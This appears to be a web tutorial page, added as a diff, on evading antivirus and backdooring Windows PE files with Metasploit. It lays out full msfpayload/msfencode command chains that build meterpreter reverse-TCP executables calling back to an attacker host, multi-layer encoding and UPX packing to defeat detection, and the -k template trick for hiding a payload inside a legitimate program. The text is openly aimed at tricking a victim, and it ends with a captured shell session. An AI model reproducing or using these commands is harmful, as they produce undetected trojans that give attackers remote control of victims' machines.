@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Tutorials: AV &amp; Windows PE</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../css/icons.css">  
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../index.html">Home</a>
+            </li>
+            <li><a href="../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../coding.html">Scripting</a>
+            </li>
+            <li><a href="../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../links.html">Links</a>
+            </li>
+            <li><a href="../patreon.html">Patreon</a></li><li><a href="../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Avoiding antivirus && Backdooring PE files</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Avoiding antivirus && Backdooring PE files<span class="line"></span></h2>
+        <p>So you have  your social-engineering boots on and you want to trick some &ldquo;poor fool&rdquo; into opening  your malicious file.  How or why you do this is  your own issue but let&rsquo;s say you succeed in your purpose. The most embarrassing  thing that can happen is if the aforementioned &ldquo;poor fool&rdquo; goes crazy because his/her  antivirus flags your file. I&rsquo;ll show you some of the measures you can take to  avoid this kind of embarrassment. I should mention that Antivirus vendors are  constantly improving their detection algorithms so what works today might not  work in a couple of months. Don&rsquo;t let this discourage you however, if your  dedicated I&rsquo;m sure you&rsquo;ll find a way to hide your dirty secrets ;)) …<br />
+            <br />
+            For the  purpose of this tutorial I&rsquo;ll be working with Windows PE files (Portable  Executable) however these techniques work with other fileformat payloads  (such as pdf&rsquo;s) so use your imagination. I&rsquo;ll also be using a high-end  Antivirus (ESET Smart Security 5,  none of that AVG bull!#*t hehe), updated  with the latest virus signature database.<br />
+            <br />
+            Atacker: Backtrack 5 =&gt; 192.168.111.129<br />
+          Victim: Windows XP =&gt; 192.168.111.128 </p>
+        
+        <br />
+      <div class="fourteen columns bottom">
+      <p>(1) I&rsquo;ll be using a meterpreter reverse tcp payload….</p>
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=9988 O</span>
+
+       Name: Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+     Module: payload/windows/meterpreter/reverse_tcp
+    Version: 10394, 12600, 8984
+   Platform: Windows
+       Arch: x86
+Needs Admin: No
+ Total size: 290
+       Rank: Normal
+
+Provided by:
+  skape &lt;mmiller@hick.org&gt;
+  sf    &lt;stephen_fewer@harmonysecurity.com&gt;
+  hdm   &lt;hdm@metasploit.com&gt;
+
+Basic options:
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+LHOST     192.168.111.129  yes       The listen address
+LPORT     9988             yes       The listen port
+
+Description:
+  Connect back to the attacker, Inject the meterpreter server DLL via 
+  the Reflective Dll Injection payload (staged)</pre>
+<br />
+</div>
+    
+    <p>&nbsp;</p>
+    <p>(2) Using this  payload we&rsquo;ll create four test cases (pay attention to the syntax).</p>
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre><span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=9988 R| msfencode
+ -e x86/shikata_ga_nai -t exe > /root/Desktop/payload-1a.exe</span>
+
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 317 (iteration=1)
+
+####################################################################################################
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=9988 R| msfencode
+ -e x86/shikata_ga_nai -c 6 -t raw| msfencode -e x86/alpha_upper -c 3 -t raw| msfencode -e 
+ x86/shikata_ga_nai -c 5 -t raw| msfencode -e x86/countdown -c 5 -t exe -o 
+ /root/Desktop/payload-2a.exe</span>
+
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 317 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 344 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 371 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 398 (iteration=4)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 425 (iteration=5)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 452 (iteration=6)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 971 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 2011 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 4090 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 4119 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 4148 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 4177 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 4206 (iteration=4)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 4235 (iteration=5)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 4253 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 4271 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 4289 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 4307 (iteration=4)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 4325 (iteration=5)
+
+####################################################################################################
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=9988 R| msfencode
+ -e x86/shikata_ga_nai -c 9 -t raw| msfencode -e x86/alpha_upper -c 5 -t raw| msfencode -e 
+ x86/shikata_ga_nai -c 9 -t raw| msfencode -e x86/countdown -c 7 -t exe -o 
+ /root/Desktop/payload-3a.exe</span>
+
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 317 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 344 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 371 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 398 (iteration=4)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 425 (iteration=5)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 452 (iteration=6)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 479 (iteration=7)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 506 (iteration=8)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 533 (iteration=9)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 1134 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 2337 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 4743 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 9555 (iteration=4)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 19179 (iteration=5)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 19208 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 19237 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 19266 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 19295 (iteration=4)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 19324 (iteration=5)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 19353 (iteration=6)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 19382 (iteration=7)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 19411 (iteration=8)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 19440 (iteration=9)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 19458 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 19476 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 19494 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 19512 (iteration=4)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 19530 (iteration=5)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 19548 (iteration=6)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 19566 (iteration=7)
+
+####################################################################################################
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=9988 R| msfencode 
+ -e x86/shikata_ga_nai -c 10 -t raw| msfencode -e x86/alpha_upper -c 6 -t raw| msfencode -e 
+ x86/shikata_ga_nai -c 10 -t raw| msfencode -e x86/countdown -c 6 -t exe -o 
+ /root/Desktop/payload-4a.exe</span>
+
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 317 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 344 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 371 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 398 (iteration=4)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 425 (iteration=5)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 452 (iteration=6)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 479 (iteration=7)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 506 (iteration=8)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 533 (iteration=9)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 560 (iteration=10)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 1188 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 2445 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 4959 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 9987 (iteration=4)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 20042 (iteration=5)
+<span style='color:#333399;'>[*]</span> x86/alpha_upper succeeded with size 40153 (iteration=6)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 40182 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 40211 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 40240 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 40269 (iteration=4)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 40298 (iteration=5)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 40327 (iteration=6)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 40356 (iteration=7)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 40385 (iteration=8)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 40414 (iteration=9)
+<span style='color:#333399;'>[*]</span> x86/shikata_ga_nai succeeded with size 40443 (iteration=10)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 40461 (iteration=1)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 40479 (iteration=2)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 40497 (iteration=3)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 40515 (iteration=4)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 40533 (iteration=5)
+<span style='color:#333399;'>[*]</span> x86/countdown succeeded with size 40551 (iteration=6)</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>(3) Time to transfer these executables to our victim machine. It is highly  advisable to turn off the Antivirus and test that your payloads are actually  functional. Sometimes you can generate executables that do not work due to overenthusiastic  encoding options. After you verify that your fileformat payloads work, re-enable  your Antivirus and test if they are properly obfuscated. As you can see in the  screenshot below one of my test cases was undetectable (all of the payloads  were confirmed to be functional).</p><p>&nbsp;</p>
+
+    
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/payload_big1.png" rel="prettyPhoto[PE]">
+          <img src="images/payload_small1.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>AV-Detection</p>
+      </div>
+
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>(4) Ok so that&rsquo;s awesome  now let&rsquo;s simulate our aforementioned &ldquo;poor fool&rdquo; opening our malicious file.  In the screenshot below we can see the output of &ldquo;netstat –an&rdquo; before and after  execution our payload and below that the output of our payload handler on  Backtrack 5.</p><br />
+  <p>=&gt; Yet another case of Game Over…</p></p><p>&nbsp;</p>
+    
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/payload_big2.png" rel="prettyPhoto[PE]">
+          <img src="images/payload_small2.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Shell</p>
+      </div>
+
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>show options</span>
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+   LHOST     192.168.111.129  yes       The listen address
+   LPORT     9988             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>exploit</span>
+
+<span style='color:#333399;'>[*]</span> Started reverse handler on 192.168.111.129:9988 
+<span style='color:#333399;'>[*]</span> Starting the payload handler...
+<span style='color:#333399;'>[*]</span> Sending stage (752128 bytes) to 192.168.111.128
+<span style='color:#333399;'>[*]</span> Meterpreter session 1 opened (192.168.111.129:9988 -> 192.168.111.128:1060) at 2011-11-05 
+    08:10:16 +0100
+
+<span style='color:#ff0000;'>meterpreter</span> &gt; <span style='color:#2B8156;'>shell</span>
+Process 1712 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+<span style='color:#ff0000;'>E:\Payloads</span>> <span style='color:#2B8156;'>...Game Over...</span></pre>
+<br /></div>
+
+<p>&nbsp;</p>
+<p>(*) We have  accomplished our goal but don&rsquo;t leave yet. There may be a case that this kind  of encoding is insufficient when this happens you can use packers to further  obfuscate your payload. A packer is a tool to compress an executable, this is  achieved by encrypting it (much like an encoder) and adding some assembly so it  can be decompressed in memory recreating the original executable. Be aware  however that like before this can break your payload. Let&rsquo;s see what happens  when we use a popular packer called UPX to compress our four test cases. According to the screenshot below it looks like test cases 3 and 4 are  undetectable now. However don&rsquo;t be too enthusiastic yet, after some testing I discovered  test case 4 was broken after packing (always test your results!!). But all&rsquo;s  not lost, we are left with two undetectable payloads: (1) The original encoded  version of test case 4 and (2) the packed version of test case 3.</p><p>&nbsp;</p>
+
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/payload_big3.png" rel="prettyPhoto[PE]">
+          <img src="images/payload_small3.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>UPX-Packed</p>
+      </div>
+      
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style='color:#ff0000;'>root@bt</span>:~/Desktop# <span style='color:#2B8156;'>upx -5 payload-1a.exe</span>
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2009
+UPX 3.04        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 27th 2009
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+     73802 ->     48128   65.21%    win32/pe     payload-1a.exe                
+
+Packed 1 file.
+<span style='color:#ff0000;'>root@bt</span>:~/Desktop# <span style='color:#2B8156;'>upx -5 payload-2a.exe</span> 
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2009
+UPX 3.04        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 27th 2009
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+     73802 ->     49152   66.60%    win32/pe     payload-2a.exe                
+
+Packed 1 file.
+<span style='color:#ff0000;'>root@bt</span>:~/Desktop# <span style='color:#2B8156;'>upx -5 payload-3a.exe</span> 
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2009
+UPX 3.04        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 27th 2009
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+     73802 ->     52736   71.46%    win32/pe     payload-3a.exe                
+
+Packed 1 file.
+<span style='color:#ff0000;'>root@bt</span>:~/Desktop# <span style='color:#2B8156;'>upx -5 payload-4a.exe</span> 
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2009
+UPX 3.04        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 27th 2009
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+     73802 ->     58368   79.09%    win32/pe     payload-4a.exe                
+
+Packed 1 file.</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>(**) Hey hey,  where are you going, don&rsquo;t leave yet hehe. There is one more thing I would like  to add. To create these fileformat payloads msfpayload uses templates. Many  Antiviruses have signatures to specifically detect these templates used by  metasploit. Consequently detection rates for payloads generated using these  templates are quite high. It is however possible to use custom templates (in  our case we could use legitimate executables) and hide our payload in those.  Detection rates for these executables will predictably be much much lower. The techniques  used for creating malicious files based on these templates is much the same as what  we have seen so far in this tutorial. The only thing to remember is that these  templates are more fragile because they contain legitimate code, you&rsquo;ll need to  do some experimenting to get them to work properly. This is however beyond the  scope of this tutorial; I&rsquo;ll just give you some basic syntax to get you started  on your journey.</p>
+  <br /><p>There are two basic variations of the command which you should take into  consideration. One which includes the &rdquo;-k&rdquo; flag and the other which doesn&rsquo;t.  When the &rdquo;-k&rdquo; flag is omitted nothing will happen when the aforementioned &rdquo;;poor  fool&rdquo; executes your payload, this might raise suspicion. If the &rdquo;-k&rdquo; flag is  included the payload is launched is a separate thread allowing the legitimate executable  to launch normally, averting suspicion. Observe the difference below…</p><p>&nbsp;</p>
+  
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=9988 R| msfencode
+ -e x86/shikata_ga_nai -c 5 -t exe -x /root/Some_Dir/legitimate.exe > 
+ /root/Desktop/legitimate-payload_1.exe</span>
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=9988 R| msfencode
+ -e x86/shikata_ga_nai -c 5 -t exe -k -x /root/Some_Dir/legitimate.exe > 
+ /root/Desktop/legitimate-payload_2.exe</span></pre>
+<br />
+</div>
+
+<br />
+</div>
+    </div>
+</div>
+      
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../index.html">Home</a> |
+          <a href="../tutorials.html">Tutorials</a> |
+          <a href="../coding.html">Scripting</a> |
+          <a href="../exploits.html">Exploits</a> |
+          <a href="../links.html">Links</a> |
+          <a href="../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
